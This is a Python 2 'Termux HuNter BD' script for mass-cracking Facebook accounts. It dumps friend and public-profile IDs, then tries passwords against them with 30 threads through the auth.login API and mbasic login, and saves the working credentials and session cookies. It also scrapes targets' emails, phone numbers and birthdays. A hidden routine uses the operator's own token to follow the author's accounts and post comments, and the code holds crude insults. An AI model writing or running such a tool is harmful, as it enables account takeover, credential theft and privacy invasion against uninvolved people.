#!/usr/bin/python2
# coding=utf-8
# code by N00B B0SS
import os
try:
    import requests
except ImportError:
    print '\n [✅] Module requests install!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [✅] Module Futures install!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [✅] Module install Bs4...\n'
    os.system('pip2 install bs4')

import requests, sys, bs4, os, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan1 = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {
        "01": "January",
        "02": "February",
        "03": "March",
        "04": "April",
        "05": "May",
        "06": "June",
        "07": "July",
        "08": "Agustus",
        "09": "September",
        "10": "October",
        "11": "November",
        "12": "December"
}

### WARNA RANDOM ###
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)


ok = []
cp = []
id = []
user = []
score = 0
xi_jimpinx = '1714000985456399'
koh = '100005395413800'
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
#der jalan
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] Press Enter %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)


# LO KONTOL
IP = requests.get('http://yayanxd.herokuapp.com/ip').text
logo = ''' \033[0;96m 

████████╗███████╗██████╗░███╗░░░███╗██╗░░░██╗██╗░░██╗
╚══██╔══╝██╔════╝██╔══██╗████╗░████║██║░░░██║╚██╗██╔╝
░░░██║░░░█████╗░░██████╔╝██╔████╔██║██║░░░██║░╚███╔╝░
░░░██║░░░██╔══╝░░██╔══██╗██║╚██╔╝██║██║░░░██║░██╔██╗░
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║╚██████╔╝██╔╝╚██╗
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝
\033[1;92m
██╗░░██╗██╗░░░██╗███╗░░██╗████████╗███████╗██████╗░
██║░░██║██║░░░██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║░░░██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝
██╔══██║██║░░░██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗
██║░░██║╚██████╔╝██║░╚███║░░░██║░░░███████╗██║░░██║
╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝   
\033[1;91m 
                 ██████╗░██████╗░
                 ██╔══██╗██╔══██╗
                 ██████╦╝██║░░██║
                 ██╔══██╗██║░░██║
                 ██████╦╝██████╔╝
                 ╚═════╝░╚═════╝░
        
        Developer : \x1b[1;93mMamun Ahmed Fahim \x1b[1;97m[N00B  B0SS]
  \n\x1b[1;96m        Our Group : \033[1;91mTermux HuNter BD \n\n''' 
os.system('clear')
lo_ngentod = '1714009362122228'

def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] Cloning Process...'%(N,K,N)
        print '\n\n ℅s[%s Total Success ID%s ]: %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] Total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] Wrong Input :'%(M,N);exit()

#masuk token
def yayanxd():
    os.system('clear')
    print logo 
    print ('\x1b[1;92m Past Your Facebook Fake Account Token ')
    kontol = raw_input('\n %s[%s$%s] Past Your Token :%s '%(N,M,N,H))
    if kontol in ('open', 'Open', 'OPEN'):
        
        
        
        raw_input(' %s*%s Enter Past Token '%(O,N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    try:
        xzxz = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol))
        xdxd = json.loads(xzxz.text)
        nama = xdxd['name']
        wuhan(kontol)
   
        open('.pic/.fahim.txt', 'w').write(kontol)
        raw_input(' %sPress Enter%s '%(O,N))
        os.system('xdg-open https://www.facebook.com/mamun.ahmed.fahim.5')
        os.system('clear')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()

os.system('clear')
print logo 
print 47 *'\x1b[1;93m='
CorrectUsername = "Termux HuNter BD"
CorrectPassword = "N00B B0SS"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m \x1b[1;97mTools Username  \x1b[1;32m====> ")
    if (username == CorrectUsername):
   	password = raw_input("\033[1;96m \x1b[1;97mTools Password  \x1b[1;96m====> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'Error'
        else:
            print "Wrong Password"
            os.system('xdg-open https://facebook.com/groups/712018426175028/')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.facebook.com/mamun.ahmed.fahim.5')
### ORANG GANTENG ###
def moch_yayan():
  
    os.system('clear')

    try:
    	kontol = open('.pic/.fahim.txt', 'r').read()
    except (KeyError,IOError):
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .fahim.txt');yayanxd()
    try:
        req = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol))
        get = json.loads(req.text)
        nama = get['name']
    except (KeyError,IOError):
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .pic/.fahim.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] Error\n'%(N,M,N))
    os.system('clear')
    print logo 
    
    print 47 * '\x1b[1;93m='
    print ' \033[0;92m<>\033[1;93m Your Facebook ID : %s'%(nama)
    print ' \033[0;93m<>\033[1;96m DEVICE   : %s'%(IP)
    print 47 * '\x1b[1;96m='
    print '\033[1;93m1 \x1b[1;92m Dump Friends ID'
    print '\033[1;93m2 \x1b[1;93m Dump Public ID'
    print '\033[1;93m3 \x1b[1;96m File Cloning '
    print '\033[1;93m4 \x1b[1;97m Check Information IDs'
    print '\033[1;93m5 \x1b[1;95m Check Cloning IDs ok/cp'
    print '\033[1;93m6 \x1b[1;94m Settings user agent'
    print '\033[1;93m0 \x1b[1;91m logout '
    print 47 * '\x1b[1;93m='
    pepek = raw_input('\n\x1b[1;90m[#] Choice an Option : ')
    if pepek == '':
        print '\n %s[%s×%s] Wrong Input!'%(N,M,N);time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
    elif pepek in['3','03']:
        __crack__().plerr()
    elif pepek in['4','04']:
        cek_ingfo(kontol)
    elif pepek in['5','05']:
        os.system('clear')
        print logo 
        print 47*'\x1b[1;96m='
        print '\n %s[%s1%s] Check OKs ID'%(N,O,N)
        print '\n %s[%s2%s] Check CPs ID'%(N,O,N)
        print 47*'\x1b[1;96m='
        memek = raw_input("\n %s[%s?%s] Choose : "%(N,K,N))
        if memek =='':
            print '\n %s[%s×%s] wrong input '%(N,M,N);time.sleep(1);moch_yayan()
        elif memek in['1','01']:
            try:
                totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
                print(" [%s+%s] All %sOK%s ID %s: %s%s-%s-%s%s Total %s: %s%s%s\n"%(H,N,H,N,M,H,ha,op,ta,N,M,H,len(totalok),H))
                os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
                raw_input('\n  [ %sEnter%s ] '%(O,N));moch_yayan()
            except (KeyError,IOError):
                print("\n %s[%s×%s] Result Not Found OK ID :"%(N,M,N))
                raw_input('\n  [ %sEnter%s ] '%(O,N));moch_yayan()
        elif memek in['2','02']:
            try:
                totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
                print(" [%s×%s] All %sCP%s ID %s: %s%s-%s-%s%s Total %s: %s%s%s\n"%(K,N,K,N,M,K,ha,op,ta,N,M,K,len(totalcp),K))
                os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
                raw_input('\n  [ %sTYPE ANY OPTION %s ] '%(O,N));moch_yayan()
            except (KeyError,IOError):
                print("\n %s[%s×%s] Result Not Found CP ID :"%(N,M,N))
                raw_input('\n  [ %sEnter %s ] '%(O,N));moch_yayan()
        else:
            print '\n %s[%s×%s] Wrong Input '%(N,M,N);time.sleep(1);moch_yayan()
    elif pepek in['6','06']:
        seting_N00B()
    elif pepek in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .pic/.fahim.txt')
        jalan('\n %s[%s#%s]%s Remove Token'%(N,H,N,H));exit()
    else:
        print '\n %s[%s×%s] menu [%s%s%s] Wrong Input'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()


def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100022602965953/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
    except:
    	pass


def teman(kontol):
    os.system('clear')
    print logo 
    print 47 *'\033[1;93m='
    try:
        os.mkdir('dump')
    except:pass
    try:
        boss = raw_input('\n %s[%s?%s] Write File Name  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] How Limit ID  : '%(N,O,N))
        cin = ('dump/' + boss + '.json').replace(' ', '_')
        ys  = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            id.append(a['id'] + ' | ' + a['name'])
            ys.write(a['id'] + ' | ' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Process Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s#%s] All Friends ID Dump Completed'%(N,H,N))
        print ' [%s$%s] Your New File Name ( %s%s%s )'%(O,N,M,cin,N)
        print 47*'\x1b[1;96m='
        raw_input(' ENTER')
        moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Wrong Type\n'%(N,M,N))
        raw_input(' [ %sEnter%s ] '%(O,N));moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''



def publik(kontol):
    os.system('clear')
    print logo 
    print 47 *'\033[1;93m='
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] Public ID  : '%(N,O,N))
        noob = raw_input(' %s[%s?%s] File Name  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] How Limit ID   : '%(N,O,N))
        knt = ('dump/' + noob + '.json').replace(' ', '_')
        ys  = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            id.append(a['id'] + ' | ' + a['name'])
            ys.write(a['id'] + ' | ' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Process Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s#%s] Dump Your All Public ID'%(N,H,N))
        print ' [%s#%s] Your New File Name ( %s%s%s )'%(O,N,M,knt,N)
        print 47 *'\x1b[1;93m='
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Wrong Type\n'%(N,M,N))
        raw_input(' [ %sEnter%s ] '%(O,N));moch_yayan()

# cek ingfo
def cek_ingfo(kontol):
    os.system('clear')
    print logo 
    print 47*'\x1b[1;96m='
    user = raw_input("\n [%s+%s] TYPE YOUR TARGET FB ID CODE : "%(O,N))
    url = ("https://lookup-id.com/")
    
    if "facebook" in user:
        payload = {"fburl": user, "check": "Lookup"}
    else:
        payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
    halaman = requests.post(url, data = payload).text.encode("utf-8")
    sop_ = BeautifulSoup(halaman, "html.parser")
    email_ = sop_.find("span", id = "code")
    idt = email_.text
    aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, kontol))
    x = json.loads(aww.text)
    try:
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s'%(M,N)
    print '\n\x1b[1;93m  # Facebook Information #\n';time.sleep(0.03)
    print '\n [#]\x1b[1;92m Profile Full Name \x1b[1;91m: %s'%(nmaa);time.sleep(0.03)
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    print ' [#]\x1b[1;93m First Name   \x1b[1;96m: %s'%(ndpn);time.sleep(0.03)
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;97m Last Name\x1b[1;92m: %s'%(nmbl);time.sleep(0.03)
    try:
    	hwhs = x['username']
    except (KeyError, IOError):
    	hwhs = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;94m Facebook ID Username : %s'%(hwhs);time.sleep(0.03)
    try:
    	asu = x['id']
    except (KeyError, IOError):
    	asu = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;95m Facebook ID Code  : %s'%(asu);time.sleep(0.03)
    print '\n\x1b[1;93m  # Your Facebook Data #\n';time.sleep(0.03)
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;96m Facebook Gmail \x1b[1;92m: %s'%(emai);time.sleep(0.03)
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;93m Phone Number  \x1b[1;92m: %s'%(nmrr);time.sleep(0.03)
    try:
    	ttll = x['birthday']
        month, day, year = ttll.split("/")
        month = bulan[month]
    except (KeyError, IOError):
    	month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
        year = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;96m Birthday  \x1b[1;92m: %s %s %s '%(day,month,year);time.sleep(0.03)
    try:
    	jenis = x['gender'].replace("Famale", "Perempuan").replace("Male", "other")
    except (KeyError, IOError):
    	jenis = ''
    except: pass
    print ' [#]\x1b[1;95m Gender \x1b[1;92m: %s '%(jenis)
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except: pass
    print ' [#]\x1b[1;94m Total Friends  \x1b[1;92m: %s'%str(len(id));time.sleep(0.03)
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;92m Total Followers\x1b[1;92m: %s'%(pengikut);time.sleep(0.03)
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;91m Facebook ID Link  \x1b[1;90m: %s'%(lins);time.sleep(0.03)
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%s-%s'%(M,N)
    except: pass
    try:
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;93m status \x1b[1;92m: %s %s'%(stas,dgn);time.sleep(0.03)
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;96m About \x1b[1;92m: %s'%(bioo);time.sleep(0.03)
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;97m Home Town      \x1b[1;92m: %s'%(dari);time.sleep(0.03)
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;91m Location     \x1b[1;92m: %s'%(tigl);time.sleep(0.03)
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    print ' [#]\x1b[1;95m Country Time     \x1b[1;92m: %s'%(tzim);time.sleep(0.03)
    try:
    	jam  = x['updated_time'][11:19]
    	uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan[month]
    except (KeyError, IOError):
    	year = '%s-%s'%(M,N)
        month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
    except:pass
    print ' [#]\x1b[1;96m Locale Time %s Day %s Month %s Year %s'%(day, month, year, jam)
    time.sleep(0.03)
    print 47*'\x1b[1;96m='
    jalan('\n\x1b[1;91mExit ');exit()



### ganti user agent
def seting_N00B():
    os.system('clear')
    print logo
    print 47*'\x1b[1;96m='
    print '\n1 \x1b[1;92m Change Your Tools User Agent'
    print '\n2 \x1b[1;96m Check User Agent'
    ytbjts = raw_input('\n\x1b[1;93m Choice an Option: ')
    if ytbjts == '':
        print '\n %s[%s×%s] Wrong Input'%(N,M,N);time.sleep(2);seting_N00B()
    elif ytbjts =='1':
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts =='2':
        check_N00B()
    else:
        print '\n %s[%s×%s] Wrong Input'%(N,M,N);time.sleep(2);seting_N00B()


# User Agent baru
def yo_ndak_tau_ko_tanya_saia():
 
    os.system('rm -rf N00B.txt')
    os.system('clear')
    print logo 
    print 47 *'\033[1;93m='
    print '\n\x1b[1;96m Add The New User Agent\n'
    anjng = raw_input('\x1b[1;93m Past New User Agent : ')
    if anjng == '':
        print '\n %s[%s×%s] Wrong Input'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    try:
        open('N00B.txt', 'w').write(anjng);time.sleep(2)
        jalan('\n %s[%s#%s] Add User Agent Done...'%(N,H,N))
        raw_input('\n  %s[ %sEnter%s ]'%(N,O,N));moch_yayan()
    except:pass


# Cek User Agent
def check_N00B():
    os.system('clear')
    print logo
    try:
        user_agent = open('N00B.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n %s[%s+%s] Check User Agent : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n  %s[ %sEnter%s ]'%(N,O,N));moch_yayan()

class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] FILE LOCATION : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] TOTAL ID  |  %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] Wrong Input'%(N,M,N,M,self.apk,N);time.sleep(3);moch_yayan()
        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__yan__()
                        elif cin == '1':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '3':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__yan__()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [%s1%s]. method API (fast)'%(O,N)
                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);moch_yayan()
        return


    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)),
               'x-fb-net-hni': str(random.randint(20000, 40000)),
               'x-fb-connection-quality': 'EXCELLENT',
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
               'user-agent': _kontol,
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-http-engine': 'Liger'}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if re.search('(EAAA)\\w+', response.text):
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.pic/.fahim.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
                    az = json.loads(ak.text)
                    graph = az["birthday"]
                    month, day, year = graph.split("/")
                    month = bulan[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1


    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.pic/.fahim.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
                    az = json.loads(ak.text)
                    graph = az["birthday"]
                    month, day, year = graph.split("/")
                    month = bulan[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
